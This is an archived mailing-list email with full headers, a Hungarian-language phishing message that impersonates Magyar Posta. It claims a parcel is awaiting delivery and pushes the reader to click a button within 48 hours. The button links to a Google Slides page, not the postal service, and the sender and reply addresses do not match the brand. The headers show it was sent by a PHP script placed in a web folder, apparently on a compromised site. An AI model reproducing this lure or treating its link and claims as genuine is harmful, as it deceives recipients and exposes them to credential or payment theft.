Return-Path: <linux-mediatek-bounces+linux-mediatek=archiver.kernel.org@lists.infradead.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from bombadil.infradead.org (bombadil.infradead.org [198.137.202.133])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id C78E3CDB482
	for <linux-mediatek@archiver.kernel.org>; Sat, 14 Oct 2023 03:18:41 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.infradead.org; s=bombadil.20210309; h=Sender:List-Subscribe:List-Help
	:List-Post:List-Archive:List-Unsubscribe:List-Id:From:Message-Id:Date:Subject
	:To:Reply-To:Cc:MIME-Version:Content-Type:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=EaGxqjR01uRkzO634MgaFPAoojPE843aDijiDxqBXU0=; b=IAOtnu4VSxTdAwNxuzXhB6IocI
	qWvnRjlOvwBtfkjjpWJJ44E5nCwN3NYFKwPYS24r/Osyq2eJ/Gt64yOXq1hk9ytSmWyTzeaptOEtc
	jhvX8HUAIrMjNJ77LR75xbfsVa25puqKBBH20PQbx8zHDcLCgp8v1kb2elVxRMc+Z/81nzrCRrXCM
	/CDUYHfsoQktzB1ByoGsudNpi4DfQgeVYhVC0Eykmrs6q6Z3r1fhYFhM7y5x52+c4ZWKc5pAjykV/
	uuqtWRbz0bWp3PvIVHzHdUyi90ogBv7SCd2uKrF2WRXtprL/HwezhszifnXPm57LopAFFzkGAbAyD
	IM9oyOgQ==;
Received: from localhost ([::1] helo=bombadil.infradead.org)
	by bombadil.infradead.org with esmtp (Exim 4.96 #2 (Red Hat Linux))
	id 1qrVAl-004hYJ-1d;
	Sat, 14 Oct 2023 03:18:39 +0000
Received: from casper.infradead.org ([2001:8b0:10b:1236::1])
	by bombadil.infradead.org with esmtps (Exim 4.96 #2 (Red Hat Linux))
	id 1qrVAl-004hYA-0V
	for linux-mediatek@bombadil.infradead.org;
	Sat, 14 Oct 2023 03:18:39 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=infradead.org; s=casper.20170209; h=From:Message-Id:Date:Subject:To:Sender:
	Reply-To:Cc:MIME-Version:Content-Type:Content-Transfer-Encoding:Content-ID:
	Content-Description:In-Reply-To:References;
	bh=EaGxqjR01uRkzO634MgaFPAoojPE843aDijiDxqBXU0=; b=CIF9S1qHmiPO8tPKBGcar+xoNj
	Kfs4EN7KrFjb8CkVTkD0lRPcGWtocM8IWH3U5FiAESQG2G+lyBixs/ThBrj78Rp6y8+Xz3k+bNhmV
	F5+H+ik9yGo2zNkyQsystmDeOQi3J4zuqR/RQi4OVCZwRelZv5QlM8HtELhlIIkSI9DIy31hW4MKx
	6AU5FbWIByggSWxqy6/j6HEvLPuOZualWBfj1RGcecMgEovp9g7pdM0gWXokG8xgrzwhs3ErRFbgw
	aLhRkjaQwT9KizLlLTvSITiUjsIwxAe4ummdKFv1Mub3qEKraiFJ+ITQSLjLzbx3I9i9gnKvZwa1o
	K7tTn8NQ==;
Received: from ns3171530.ip-151-106-39.eu ([151.106.39.178])
	by casper.infradead.org with esmtps (Exim 4.94.2 #2 (Red Hat Linux))
	id 1qrVAh-0097vq-Cv
	for linux-mediatek@lists.infradead.org; Sat, 14 Oct 2023 03:18:37 +0000
Received: from ppsmt123 by ns3171530.ip-151-106-39.eu with local (Exim 4.96.1)
	(envelope-from <support@ppsmt.in>)
	id 1qrVAZ-000GOZ-2M
	for linux-mediatek@lists.infradead.org;
	Sat, 14 Oct 2023 03:18:27 +0000
To: linux-mediatek@lists.infradead.org
Subject: =?UTF-8?Q?[S=C3=9CRG=C5=90S]:_Azonnali_int=C3=A9zked=C3=A9sre_van_sz?=  =?UTF-8?Q?=C3=BCks=C3=A9g_a_f=C3=BCgg=C5=91ben_l=C3=A9v=C5=91_sz=C3=A1ll?=  =?UTF-8?Q?=C3=ADt=C3=A1si_utas=C3=ADt=C3=A1sokhoz?=
X-PHP-Script: ppsmt.in/.well-known/pki-validation/131302e4-f290-4090-96aa-d0f45dd3d6d1.php for 23.233.157.228, 23.233.157.228
 X-PHP-Originating-Script: 1037:131302e4-f290-4090-96aa-d0f45dd3d6d1.php
Date: Sat, 14 Oct 2023 03:18:27 +0000
 From: =?UTF-8?Q?Hi_linux-mediatek_*_a_Magyar_Posta_*_=C3=A9rtes=C3=ADt=C3=A9st_?=
  =?UTF-8?Q?k=C3=BCld=C3=B6tt_=C3=96nnek?= <support@ppsmt.in>
 Reply-To: kaabala009@outlook.com
 Message-ID: <8e997260c8e69b349f3db43104f3c654@ppsmt.in>
 MIME-Version: 1.0
 Content-Type: multipart/alternative;
 	boundary="b1_8e997260c8e69b349f3db43104f3c654"
 Content-Transfer-Encoding: 8bit
Message-Id: <E1qrVAZ-000GOZ-2M@ns3171530.ip-151-106-39.eu>
From: support@ppsmt.in
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - ns3171530.ip-151-106-39.eu
X-AntiAbuse: Original Domain - lists.infradead.org
X-AntiAbuse: Originator/Caller UID/GID - [1037 983] / [47 12]
X-AntiAbuse: Sender Address Domain - ppsmt.in
X-Get-Message-Sender-Via: ns3171530.ip-151-106-39.eu: authenticated_id: ppsmt123/from_h
X-Authenticated-Sender: ns3171530.ip-151-106-39.eu: support@ppsmt.in
X-Source: 
X-Source-Args: php-fpm: pool ppsmt_in                                   
X-Source-Dir: ppsmt.in:/public_html/.well-known/pki-validation
X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
X-CRM114-CacheID: sfid-20231014_041835_748376_4A3824CE 
X-CRM114-Status: UNSURE (  -3.45  )
X-CRM114-Notice: Please train this message.
X-BeenThere: linux-mediatek@lists.infradead.org
X-Mailman-Version: 2.1.34
Precedence: list
List-Id: <linux-mediatek.lists.infradead.org>
List-Unsubscribe: <http://lists.infradead.org/mailman/options/linux-mediatek>,
 <mailto:linux-mediatek-request@lists.infradead.org?subject=unsubscribe>
List-Archive: <http://lists.infradead.org/pipermail/linux-mediatek/>
List-Post: <mailto:linux-mediatek@lists.infradead.org>
List-Help: <mailto:linux-mediatek-request@lists.infradead.org?subject=help>
List-Subscribe: <http://lists.infradead.org/mailman/listinfo/linux-mediatek>,
 <mailto:linux-mediatek-request@lists.infradead.org?subject=subscribe>
Sender: "Linux-mediatek" <linux-mediatek-bounces@lists.infradead.org>
Errors-To: linux-mediatek-bounces+linux-mediatek=archiver.kernel.org@lists.infradead.org

This is a multi-part message in MIME format.

--b1_8e997260c8e69b349f3db43104f3c654
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit











Tisztelt ügyfelünk

A csomag szállításra vár.

Folytassa a vétel megerősítésével az alábbi gombbal.
Kattintson ide
 Ne feledje, hogy ezt a megerősítést a következő 48 órán belül meg kell tenni. Egy e-mailt fog kapni, amely megerősíti a szállítmányt nyomon követési információkkal


 Magyar Posta  az ügyfelek szolgáltatásaihoz 
   Magyar Posta Szolgáltató vállalat 
 
 
 
 
If you have a problem.
 További részletekért vegye fel velünk a kapcsolatot a  36(70)366-6611 e-mail címen vagy e-mailben
   ugyfelszolgalat@simple.hu
 


Magyar Posta 1867-2023. All rights reserved.



--b1_8e997260c8e69b349f3db43104f3c654
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 8bit

<!doctype html>
<html>
<head>
<title></title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
</head>
<body style="background:#FAFAF9; padding:30px;  text-align:center; font-family:tahoma;">
<img src="https://upload.wikimedia.org/wikipedia/en/1/19/Magyar_Posta_logo.png" style="width:240px; margin:30px 0;">
<div style="background:white; padding:40px;">
<b>Tisztelt ügyfelünk</b>
<p>
A csomag szállításra vár.
<br>
Folytassa a vétel megerősítésével az alábbi gombbal.</p>
<a href="https://docs.google.com/presentation/d/e/2PACX-1vRTN7klmHcjnZNfZvjZ8EWk_hKnd1YPdaBEIUaQUFrEfgSCdHp_D3L3vJmdf_n10QKddtes4_BG9nJp/pub?start=false&loop=false&delayms=3000&slide=id.p" target="_blank" style="margin:20px 0; display:inline-block; text-decoration:none; padding:20px 60px; background:#15ab3d;; border-radius:3px; color:black;">Kattintson ide</a>
<p> Ne feledje, hogy ezt a megerősítést a következő 48 órán belül meg kell tenni. Egy e-mailt fog kapni, amely megerősíti a szállítmányt nyomon követési információkkal</p>


<p> Magyar Posta  az ügyfelek szolgáltatásaihoz <br>
   Magyar Posta Szolgáltató vállalat </p>
 
 <hr style="margin:40px 0;">
 
 <div style="color:#5CA9EE;">
If you have a problem.
 További részletekért vegye fel velünk a kapcsolatot a  36(70)366-6611 e-mail címen vagy e-mailben
  <br> ugyfelszolgalat@simple.hu
 </div>
</div>

<p style="margin:20px 0; font-size:0.8em; color:#939291;">Magyar Posta 1867-2023. All rights reserved.</p>
</body>
</html>



--b1_8e997260c8e69b349f3db43104f3c654--


